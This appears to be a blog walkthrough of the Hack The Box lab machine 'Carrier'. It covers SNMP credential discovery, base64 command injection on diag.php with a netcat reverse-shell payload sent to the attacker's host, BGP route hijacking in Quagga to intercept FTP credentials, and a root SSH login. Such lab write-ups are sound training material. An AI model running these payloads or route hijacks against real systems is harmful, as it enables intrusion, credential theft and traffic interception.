---
layout: single
classes: wide
title:  "Walkthrough - Carrier"
date: 2019-03-17
categories:
    - "hackthebox"
    - walkthrough
tags:
    - machines
    - medium
    - linux
---

A tricky machine. It needed a lot of network configuration learning, some RCE and patience. One of the best machines I have done yet due to its medium level complexity and the output I gained from all the reading I did for this box.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/banner.JPG)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```bash
root@kali:~/Carrier# nmap -v -p- -sC -sV -oA carrier 10.10.10.105
# Nmap 7.70 scan initiated Mon Feb 11 15:32:30 2019 as: nmap -v -p- -sC -sV -oA carrier 10.10.10.105
Increasing send delay for 10.10.10.105 from 0 to 5 due to 42 out of 139 dropped probes since last increase.
Nmap scan report for 10.10.10.105
Host is up (0.26s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 11 15:46:38 2019 -- 1 IP address (1 host up) scanned in 847.77 seconds
root@kali:~/Carrier# nmap -sU -p 161 -sV -oA carrier-udp 10.10.10.105
# Nmap 7.70 scan initiated Mon Feb 11 15:42:40 2019 as: nmap -sU -p 161 -sV -oA carrier-udp 10.10.10.105
Nmap scan report for 10.10.10.105
Host is up (0.019s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```

So we have a filtered FTP port, port 22 running SSH and port 80 running Apache httpd server and a UDP port running SNMP server.
The SSH and FTP probably won't get us anywhere. So let's start with HTTP.

We get this when we visit the webpage.

![webpage]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/webpage.png)

We can see two error codes. Generally displayed to show some errors in the underlying system configuration. Let's try to get all the available directories on the webpage.

```bash
root@kali:~/Carrier# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.105/FUZZ                                                                                        

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.                                                         

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.105/FUZZ
Total requests: 950

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000244:  C=301      9 L       28 W          310 Ch        "css"
000262:  C=301      9 L       28 W          312 Ch        "debug"
000294:  C=301      9 L       28 W          310 Ch        "doc"
000430:  C=301      9 L       28 W          310 Ch        "img"
000470:  C=301      9 L       28 W          309 Ch        "js"
000844:  C=301      9 L       28 W          312 Ch        "tools"

Total time: 24.39516
Processed Requests: 950
Filtered Requests: 944
Requests/sec.: 38.94214

```

Great. So we found 6 directories. Let's visit each one and go from there.

I found a pdf file that identifies the error codes that we saw earlier on the welcome page.

![errorcodes]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/errorcodes.png)

One of the codes says that the default `admin` user password is set to chassis number.
Let's check the SNMP server for some information.

```bash
root@kali:~/Carrier# snmpwalk -v2c -c public 10.10.10.105 .1
Created directory: /var/lib/snmp/mib_indexes
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Looks like the password. I will use (`admin:NET_45JDX23`) as the login and see where it takes me.

![adminlogin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/loginasadmin.png)

Excellent! Going to the diagnostics page, I see a funny `ps` command like output.

![diagpage]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/diagpage.png)

When I view the page source, I could see a base64 encoded value.

![base64]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/base64.png)

```bash
root@kali:~/Carrier# echo "cXVhZ2dh" | base64 -d
quagga
```

Using Burpsuite as a proxy, I got the following request...

```http
POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.105/diag.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Cookie: PHPSESSID=forvn6e8kjv4bkdrnb874q2026
Connection: close
Upgrade-Insecure-Requests: 1

check=cXVhZ2dh
```

The `check` parameter gets value `quagga` and then displays the diagnostics for that process. So, if we did something like `quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <myip> 4444 >/tmp/f` as the value for check parameter and start a `ncat` listener on my machine, I should get a shell. Let's try it (Don't forget to convert the command to Base64).

```bash
root@kali:~/Carrier# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.10.105] 33452
whoami
root
ls
stuff
test_intercept.pcap
user.txt
cat user.txt
56******************************
```

I got the user.txt file in a root shell?! There's something else on the network. When I checked the web login, I found a `Tickets` menu and an image which looked like a network diagram. Might be relevant here.

![tickets]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/carrier-tickets.png)

Looks like someone is having trouble with FTP on one of the networks.

![tac]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/carrier/tac.png)

Now I get it, CastCom network is the one we need to breach (I guess).

```bash
ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fed9:4ea/64 scope link
       valid_lft forever preferred_lft forever
10: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe8a:f24f/64 scope link
       valid_lft forever preferred_lft forever
12: eth2@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link
       valid_lft forever preferred_lft forever

route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.99.64.1      0.0.0.0         UG    0      0        0 eth0
10.78.10.0      *               255.255.255.0   U     0      0        0 eth1
10.78.11.0      *               255.255.255.0   U     0      0        0 eth2
10.99.64.0      *               255.255.255.0   U     0      0        0 eth0
10.100.10.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.11.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.12.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.13.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.14.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.15.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.16.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.17.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.18.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.19.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.20.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.120.10.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.11.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.12.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.13.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.14.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.15.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.16.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.17.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.18.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.19.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.20.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
```

Ok. So, 10.100.0.0/16 goes to 10.78.10.2, which is AS200 / Zaza Telecom.
10.120.0.0/15 goes to 10.78.11.2, which is AS300 / CastCom.

After running a few commands and looking around, I found a cron job. I upgraded my shell using `python3 -c 'import pty;pty.spawn("/bin/bash")'` and then `sty raw -echo`, `fg` and finally `export TERM=screen` and we have an fully upgraded shell.

```bash
root@r1:/dev/shm# crontab -l | grep -v "^#"
*/10 * * * * /opt/restore.sh

root@r1:/dev/shm# cat /opt/restore.sh
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```

Basically, it's restoring the initial configuration of quagga. I changed the permissions of the executable using `chmod -x /opt/restore.sh`
Let's see the configuration.

```bash
root@r1:/dev/shm# vtysh        

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# show running-config
Building configuration...

Current configuration:
!
!
interface eth0
 ipv6 nd suppress-ra
 no link-detect
!
interface eth1
 ipv6 nd suppress-ra
 no link-detect
!
interface eth2
 ipv6 nd suppress-ra
 no link-detect
!
interface lo
 no link-detect
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
ip prefix-list 0xdf seq 5 permit 10.120.15.0/25
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
ip forwarding
!
line vty
!
end

root@r1:/dev/shm# configure terminal
r1(config)# router bgp 100
r1(config)# network 10.120.15.0/32
r1(config)# end

root@r1:/dev/shm# ip address add 10.120.15.10/24 dev eth2
```

I used this [ftpclient.py](https://github.com/RG-Belasco/PythonStuff/blob/master/ftpclient) script and downloaded it on the box using `wget` and ran the script to get FTP credentials.

```bash
root@r1:/tmp# python3 ftpclient.py
On 0.0.0.0 : 21
Enter to end...
Received: USER root
Received: PASS BGPtelc0rout1ng
Received: PASV
open 0.0.0.0 54905
Received: QUIT
```

Let's try to login using SSH using the obtained credentials.

```bash
root@kali:~/Carrier# ssh root@10.10.10.105
root@10.10.10.105's password: BGPtelc0rout1ng
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 12 00:57:08 UTC 2019

  System load:  0.0                Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 31%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   0%                 IP address for lxdbr1: 10.120.15.10
  Processes:    216

 * Meltdown, Spectre and Ubuntu: What are the attack vectors,
   how the fixes work, and everything else you need to know
   - https://ubu.one/u2Know

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.


Last login: Wed Sep  5 14:32:15 2018
root@carrier:~# cat root.txt
2******************************6
```

Great! We got it. It was a fun box, I learnt a lot about networking and router configurations. Hopefully, you will too.

Happy Hacking! Cheers!
